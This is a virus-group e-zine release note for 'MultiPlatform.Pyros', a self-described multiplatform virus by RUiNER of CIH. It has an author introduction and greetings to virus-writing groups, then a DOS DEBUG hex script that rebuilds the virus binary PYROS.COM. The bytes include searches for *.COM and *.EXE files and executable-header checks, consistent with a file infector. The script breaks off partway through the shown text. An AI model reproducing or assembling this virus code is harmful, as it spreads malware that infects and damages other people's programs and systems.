
Rat Heart's Note:
 You can find the working binary in the BINARIES directory and the
source code in a ZIP in the EXTRAS directory!
 Also, a debug script is attached at the bottom in case you want it! :)

Here's Ruiner's comments....


                ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
                º      MultiPlatform.Pyros     º¿
                ÌÄ--ú-ú ú-ÄÄ--ú --Äú--ÄÄ--Äú--Ä¹³
                º    A Multiplatform virus!    º³
                ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼³
                 ³ A new release by RUiNER /CIH ³
                 À--ú --Äú--ÄÄ--Äú--ÄÄ--ú-ú ú-ÄÄÙ

³Introduction³
À--ú --Äú--ÄÄÙ

  Well, I'm happy! :) I started this project in February and have just
finished it.. Although it's been two months, I'd done ALL the DOS half
in about three weeks in February, and  only started touching  it again
yesterday (2nd April), so this project,  although been in production a
long time, it has had rather a quite development time.  Quicker than I
had expected. 
 The virus was coded in two MAIN modules,  each having 4 or 5  include
files.  The whole development directory including the compiling  batch
file,  but  no  binaries, was 13 files  in 32Kb! Quite small, however,
there is a serious lack of commenting! Bwhawhawhawh ;)

 This  is my  final piece of work,  so I don't care if  you think it's
lame etc. 

³GREETZ³
À--ú -ÄÙ

PPL:
    Tatung      Get caught! That's smart!
    Lord Arz    What yer been up to lately?
    Flitnic     ditto.. ;)
    Z0MBiE      Did Tatung mail you in the end?
    Lord Julus  'lo! =)
    Rat Heart   Hey, what's up?

Teams (Current):
 CIH, SOS, CB, TI, ASM......

Teams (Old/Disbanded):
 VLAD, Phalcon/Skism......

~~~~~~~~~>8~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
N PYROS.COM
E 0100 E8 04 00 DE AD 66 90 E8 00 00 5A 83 EA 0A 8B EA 
E 0110 1E 06 0E 0E 1F 07 B4 1A 8D 96 57 09 CD 21 8A 86 
E 0120 D1 00 3C 00 74 41 8D B6 5F 00 8D BE 57 00 66 A5 
E 0130 66 A5 E8 45 00 B4 1A BA 80 00 07 1F CD 21 8C C0 
E 0140 05 10 00 2E 01 86 59 00 2E 03 86 5D 00 FA 2E 8B 
E 0150 A6 5B 00 8E D0 FB EA 00 00 00 00 00 00 00 00 00 
E 0160 00 F0 FF 00 00 00 00 8D B6 D2 00 BF 00 01 A5 A5 
E 0170 A5 E8 06 00 07 1F 68 00 01 C3 B4 4E 8D 96 C3 00 
E 0180 B9 07 00 CD 21 E8 66 00 73 09 E8 7F 00 B4 4F CD 
E 0190 21 EB F2 B4 4E 8D 96 C9 00 B9 07 00 CD 21 E8 4D 
E 01A0 00 73 09 E8 66 00 B4 4F CD 21 EB F2 C3 5B 50 79 
E 01B0 72 6F 73 5D 00 5B 52 75 69 6E 65 72 20 2F 43 49 
E 01C0 48 5D 00 2A 2E 43 4F 4D 00 2A 2E 45 58 45 00 00 
E 01D0 00 00 CD 20 00 00 00 00 E9 00 00 DE AD 66 00 00 
E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 9F 
E 01F0 F6 D4 9E 58 C3 B8 02 3D 8D 96 75 09 CD 21 89 86 
E 0200 CF 00 C3 B4 3E 8B 9E CF 00 CD 21 C3 E8 E6 FF E8 
E 0210 DC FF 0F 83 8B 00 B4 3F 8B 9E CF 00 B9 40 00 8D 
E 0220 96 46 0F CD 21 81 BE 46 0F 4D 5A 74 75 81 BE 46 
E 0230 0F 5A 4D 74 6D 66 81 BE 71 09 00 80 00 00 7F 5E 
E 0240 81 BE 49 0F DE AD 75 07 80 BE 4B 0F 66 74 4F B8 
E 0250 02 42 8B 9E CF 00 33 C9 33 D2 CD 21 8D B6 46 0F 
E 0260 8D BE D2 00 A5 A5 A5 2D 03 00 89 86 D9 00 C6 86 
E 0270 D1 00 00 B4 40 8B 9E CF 00 B9 50 09 8D 96 07 00 
E 0280 CD 21 B8 00 42 8B 9E CF 00 33 C9 33 D2 CD 21 B4 
E 0290 40 8B 9E CF 00 B9 06 00 8D 96 D8 00 CD 21 E8 62 
E 02A0 FF C3 33 C0 03 86 5E 0F 3D 40 00 0F 84 BE 00 66 
E 02B0 81 BE 71 09 00 20 00 00 7C E4 81 BE 58 0F 63 4D 
E 02C0 74 DC C6 86 D1 00 01 C4 86 5A 0F 89 86 5F 00 8C 
E 02D0 86 61 00 C4 86 54 0F 8C 86 63 00 89 86 65 00 8B 
